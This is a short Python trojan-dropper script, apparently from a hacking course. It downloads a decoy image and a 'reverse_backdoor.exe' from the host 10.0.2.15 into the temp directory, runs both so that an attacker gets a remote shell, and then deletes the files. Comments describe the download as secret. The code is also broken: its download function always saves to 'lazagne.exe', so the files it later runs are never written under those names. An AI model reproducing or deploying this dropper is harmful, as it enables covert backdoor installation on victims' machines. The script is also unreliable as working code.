#!/usr/bin/env python

# 2 disadvantages - target needs internet access to download the files; all files must be uploaded on a server
import requests
import subprocess
import os
import tempfile


def download(url):
    get_request = requests.get(url)
    # print (get_request.content)
    # print (get_request)

    with open("lazagne.exe", "wb") as file:
        file.write(get_request.content)


# store secretly downloaded file in temp directory and delete later automatically
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.15/car.jpg")
subprocess.Popen("car.jpg", shell=True)  # continues executing code after this
download("http://10.0.2.15/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)  # pauses code execution here, until the hacker enters exit

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")